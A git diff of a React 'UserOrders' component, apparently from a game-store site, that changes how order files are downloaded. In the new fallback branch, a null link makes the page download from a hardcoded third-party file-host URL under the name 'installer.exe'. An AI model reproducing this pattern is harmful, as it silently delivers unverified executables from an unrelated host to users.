@@ -67,38 +67,38 @@ const UserOrders = () => {
 
 
     const downloadlink = (l) => {
-        console.log(l);
-        fetch(l).then(res => res.blob()).then(file => {
-            let tempurl = URL.createObjectURL(file);
+        // fetch(l).then(res => res.blob()).then(file => {
+        //     setLoader(true);
+        //     let tempurl = URL.createObjectURL(file);
+        //     let atag = document.createElement("a");
+        //     atag.href = tempurl;
+        //     atag.download = l;          
+        //     document.body.appendChild(atag);          
+        //     atag.click();
+        //     setLoader(false);
+        //     atag.remove();
+        //     URL.revokeObjectURL(tempurl);
+        //     console.log(atag);
+        // }).catch("Note", "Cant Download This File");
+
+        if (l !== null) {
             let atag = document.createElement("a");
-            atag.href = tempurl;
+            atag.href = l;
             atag.download = l;
-            
             document.body.appendChild(atag);
-            
             atag.click();
-            
-            atag.remove();
-            
-            URL.revokeObjectURL(tempurl);
-            console.log(atag);
-        }).catch("Note", "Cant Download This File");
+        } else {
+            let atag = document.createElement("a");
+            // atag.href = "https://speed.hetzner.de/1GB.bin";
+            atag.href = "https://s1-filecr.xyz/00950b016389d65c?ref=f4730437548765be7321936f028e2313";
+            atag.download = "https://speed.hetzner.de/installer.exe";
+            document.body.appendChild(atag);
+            atag.click();
+        }
     }
 
     return (
         <>
-            {/* {
-                (orders.length < 1) ? <Loader /> : <div className='userorders'>
-                    {
-                        orders.map((o, i) => {
-                            return (<div className='orders-list' key={i}>
-                                <h1>{o.gamename}</h1>
-                                {(o.status === "Download") ? <a onClick={() => downloadFile(o)}>Download</a> : <h5>{o.status}</h5>}
-                            </div>)
-                        })
-                    }
-                </div>
-            } */}
             {
                 (orders.length > 0) && <>  <div className='userorders'>
                     {
